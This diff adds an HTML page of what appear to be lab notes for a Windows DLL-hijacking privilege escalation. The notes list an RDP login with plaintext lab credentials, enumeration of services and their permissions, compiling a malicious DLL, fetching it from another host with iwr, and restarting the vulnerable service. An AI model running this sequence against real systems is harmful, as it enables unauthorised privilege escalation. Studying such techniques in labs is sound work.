@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>DLL Hijacking</title>
+</head><body><div style="text-align: left"><span style="font-family: gg sans"><span style="font-size: 16pt">xfreerdp +home-drive /u:alex /p:WelcomeToWinter0121 /v:192.168.192.222</span></span></div>&nbsp; <br/>
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}<br/>
+<br/>
+Procmon<br/>
+<br/>
+icacls .\Documents\BetaServ.exe<br/>
+<br/>
+Restart-Service BetaService<br/>
+<br/>
+$env:path<br/>
+<div style="text-align: left"><span style="font-size: 13pt"><span style="font-family: ui-monospace">echo $PATH</span></span></div>&nbsp; <br/>
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll<br/>
+<br/>
+iwr -uri http://192.168.45.181 /myDLL.dll -Outfile myDLL.dll<br/>
+<br/>
+</body></html>
